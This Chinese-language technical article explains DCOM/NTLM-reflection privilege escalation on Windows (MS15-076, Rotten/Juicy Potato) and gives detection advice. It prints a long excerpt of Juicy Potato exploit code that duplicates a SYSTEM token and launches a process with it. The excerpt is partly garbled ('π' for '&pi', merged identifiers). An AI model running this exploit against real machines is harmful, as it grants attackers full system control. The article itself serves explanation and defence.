**ATT &CK** **攻击技术之DCOM提权**

# 0×00 概述

本地提权在att&ck中一个比较大的概念,在metasploit中早期也提供了getsystem的命令,默认是使用命名管道模仿和令牌模仿.而DCOM提权是使用DCOM协议接口,NTLM认证重放技术的提权.

# 0×01 利用方法解析

dcom提权操作的开始一般是使用CoGetInstanceFromIStorageAPI函数远程创建一个默认高权限的COM对象,其中的
IStorage参数指定了创建高权限com对象((bits对象))时可以加载的配置.本技术最早出现在google安全研究人员开发的
POC(参考1),调用函数后再创建本地线程并接收高权限COM对象传送来的NTLM验证请求后,最后反射回DCOM接口远程

创建了CLSID_Package:f20da720-c02f-11ce-927b-0800095ae340(本COM对象有代码执行漏洞).以上被命名为(ms15-076,cve-2015-2370)

![image-1.png](https://image.3001.net/images/20200401/1585731514_5e8457bacf248.png!small)  

COM技术是windows平台上使用的组件技术,通过在注册表中存储interface,CLISD等.windows平台可以进程内(dll),进程外(exe)调用对象实现

![image-2.png](https://image.3001.net/images/20200401/1585731528_5e8457c82c044.png!small)![image-3.png](https://image.3001.net/images/20200401/1585731550_5e8457de7ed12.png!small)  

当跨平台使用com时,windows参考rpc远程调用封装实现了dcom协议,定义了两个RPC接口

    
    
    [ 
    
     uuid(000001A0-0000-0000-C000-000000000046),  pointer_default(unique) 
    
    ] 
    
    interface IRemoteSCMActivator 
    
    [ 
    
       uuid(99fcfec4-5260-101b-bbcb-00aa0021347a),  pointer_default(unique) 
    
    ] 
    
    interface IObjectExporter  
    

dcom协议本身的RPC头部与正常的RPC头部相同,不同的是RPC body包含了OPCTHIS,OPCTHAT等的定义.

而foxglovesecurity对于以上的方式进行了修改,本地线程接收到DCOM提出传送来的NTLM验证请求后,不再反射回
DCOM接口本身,而是向windows本地申请令牌.这也可以称为"烂土豆".在此之前他们使用LLMNR,NBT-NS劫持后,被动等待windows
update进程发送NTLM请求的方法,称为"热土豆".见参考三

其实用户只要具有SeImpersonate或SeAssignPrimaryToken权限,并可以创建其它具有系统权限的对象(不仅仅是bits)来完成同样的DCOM提权攻击,并称为Juicy
Potato.当前最为通用的DCOM提权poc代码,效果如下

    
    
    int wmain(int argc, wchar_t** argv) 
    
    {
    
             BOOLbrute = FALSE; 
    
             strcpy(dcom_ip,"127.0.0.1");
    
             //Fallback to default BITS CLSID 
    
             if(olestr == NULL) 
    
                     olestr = L"{4991d34b-80a1-4291-83b6-3328366b9097}";
    
             exit(Juicy(NULL,FALSE)); 
    
    } 
    
    int Juicy(wchar_t *clsid, BOOL brute) { 
    
             PotatoAPI*test = new PotatoAPI(); 
    
             test->startCOMListenerThread(); 
    
             if(clsid != NULL) 
    
                    olestr = clsid;
    
             if(!TEST_mode) 
    
                     printf("Testing %S %S\n", olestr, g_port);
    
             test->startRPCConnectionThread(); //创建到本地rpc请求连接,在接收到DCOM发回的NTLM请求后,程序本身不构造NTLM响应,而 test->triggerDCOM(); //触发CoGetInstanceFromIStorage 
    
             BOOLresult = false;
    
             intret = 0; 
    
             while(true) {   //重放NTLM获取令牌并创建新进程
    
                     if (test->negotiator->authResult != -1) 
    
                     {
    
                            HANDLE hToken; 
    
                            TOKEN_PRIVILEGES tkp; 
    
                             SECURITY_DESCRIPTOR sdSecurityDescriptor; 
    
                            if (!TEST_mode) 
    
                                      printf("\n[+] authresult %d\n",test->negotiator->authResult);
    
                            fflush(stdout);
    
                            // Get a token for this process.  
    
                            if (!OpenProcessToken(GetCurrentProcess(), 
    
                                     TOKEN_ALL_ACCESS, &hToken))return 0;
    
                            //enable privileges 
    
                             EnablePriv(hToken, SE_IMPERSONATE_NAME); 
    
                             EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME); 
    
                             PTOKEN_TYPE ptg; 
    
                             DWORD dwl = 0; 
    
                             HANDLE hProcessToken; 
    
                             OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, 
    
                                    &hProcessToken);
    
                              QuerySecurityContextToken(test->negotiator->phContext,&elevated_token); 
    
                              IsTokenSystem(elevated_token);           
    
                              if(TEST_mode) 
    
                                    return 1;
    
                              GetTokenInformation(elevated_token, TokenType, &ptg,sizeof(TOKEN_TYPE), &dwl); 
    
                              if (!dwl) 
    
                                      printf("[-] Error getting token type: error code0x%lx\n", GetLastError());
    
                              result = DuplicateTokenEx(elevated_token, 
    
                                    TOKEN_ALL_ACCESS, 
    
                                    NULL, 
    
                                    SecurityImpersonation, 
    
                                    TokenPrimary, 
    
                                    &duped_token);
    
                              GetTokenInformation(duped_token, TokenType, &ptg,sizeof(TOKEN_TYPE), &dwl); 
    
                              if (!dwl) 
    
                                      printf("Error getting token type: error code0x%lx\n", GetLastError());
    
                              DWORD SessionId; 
    
                              PROCESS_INFORMATION pi; 
    
                              STARTUPINFO si; 
    
                              SECURITY_ATTRIBUTES sa;
    
                              ZeroMemory(&si,sizeof(STARTUPINFO));            
    
                              ZeroMemory(π,sizeof(PROCESS_INFORMATION)); 
    
                              memset(π, 0x00, sizeof(PROCESS_INFORMATION)); 
    
                              si.cb = sizeof(STARTUPINFO); 
    
                              si.lpDesktop = L"winsta0\\default";
    
    
    
                              DWORD sessionId = WTSGetActiveConsoleSessionId(); 
    
     
    
                              fflush(stdout);           
    
                              wchar_tcommand[256]; 
    
                              wcscpy(command, processname); 
    
     
    
                              if (processargs != NULL) 
    
                              { 
    
                                     wcsncat(command, L" ", 1); 
    
                                     wcsncat(command, processargs, wcslen(processargs)); 
    
                              } 
    
     
    
                              if (*processtype == 't' || *processtype == '*') 
    
                              { 
    
                                     //could be also the elevated_token  
    
                                     result = CreateProcessWithTokenW(duped_token, 
    
                                            0, 
    
                                            processname,                   
    
                                            command,
    
                                            0, 
    
                                            NULL, 
    
                                            NULL, 
    
                                            &si, 
    
                                            π); 
    
     
    
                                      if (!result) 
    
                                      { 
    
                                               printf("\n[-] CreateProcessWithTokenW Failed to createproc: %d\n", GetLastError())
    
                                      } 
    
                                      else 
    
                                      { 
    
                                                printf("\n[+] CreateProcessWithTokenW OK\n"); 
    
                                                break; 
    
                                      } 
    
                                }  
    
     
    
                             if (*processtype == 'u' || *processtype == '*') 
    
                             { 
    
                                      //could be also the elevated_token  
    
                                      result= CreateProcessAsUserW(                     
    
                                                 duped_token,                      
    
                                                 processname,                   
    
                                                 command,
    
                                                 nullptr,nullptr,                   
    
                                                 FALSE, 0, nullptr, 
    
                                                 L"C:\\", &si, π 
    
                                       ); 
    
     
    
                                       if (!result) { 
    
                                               printf("\n[-] CreateProcessAsUser Failed to createproc: %d\n", GetLastError())
    
                                        } 
    
                                        else { 
    
                                               printf("\n[+] CreateProcessAsUser OK\n"); 
    
                                               break; 
    
                                        } 
    
                            }//end argv 
    
     
    
                            if (!result) 
    
                                        break; 
    
                            else { 
    
                                        printf("Waiting for auth..."); 
    
                                        Sleep(500); 
    
                                        fflush(stdout); 
    
                            } 
    
                    }//end auth 
    
            } 
    
            return result; 
    
    }    
    

``

  

``

# 0×02 检测思路

CoGetInstanceFromIStorage函数本身在创建高权限DCOM对象后,解析IStorage参数.如果为一个地址.触发

ResolveOxid2(IObjectExporter模式)之前会默认使用NTLM认证.重放NTLM认证到本地或者反射回DCOM.这是整个
DCOM提权的攻击链条,在网络中检测TCP/135流量,识别IRemoteSCMActivator
RPC接口的IStorage参数,一定会使用marshaldata,包含了标准列集01,handle列集02,自定义列集04等.如果是一个IP地址即列为告警.

或者去除危险进程使用账户的SeImpersonate或者SeAssignPrimaryToken权限

# 0×03 参考链接

[](https://bugs.chromium.org/p/project-zero/issues/detail?id=325&redir=1)[https://bugs.chromium.org/p/project-zero/issues/detail?id=325&redir=1 ](https://bugs.chromium.org/p/project-zero/issues/detail?id=325&redir=1)[](https://bugs.chromium.org/p/project-zero/issues/detail?id=325&redir=1)

[](https://silentbreaksecurity.com/exploiting-ms15-076-cve-2015-2370/)[https://silentbreaksecurity.com/exploiting-ms15-076-cve-2015-2370/ ](https://silentbreaksecurity.com/exploiting-ms15-076-cve-2015-2370/)[-ms15-076-cve-2015-2370/
](https://silentbreaksecurity.com/exploiting-ms15-076-cve-2015-2370/)

[](https://github.com/foxglovesec/RottenPotato)<https://github.com/foxglovesec/RottenPotato>[](https://github.com/foxglovesec/RottenPotato)[
](https://github.com/foxglovesec/RottenPotato)(ATT&CK T1171)

<https://www.freebuf.com/column/181549.html>

[](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)<https://paper.seebug.org/844/>[](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

[](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)[https://foxglovesecurity.com/2016 potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016%20potato-privilege-escalation-from-service-accounts-to-system/)[](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

  

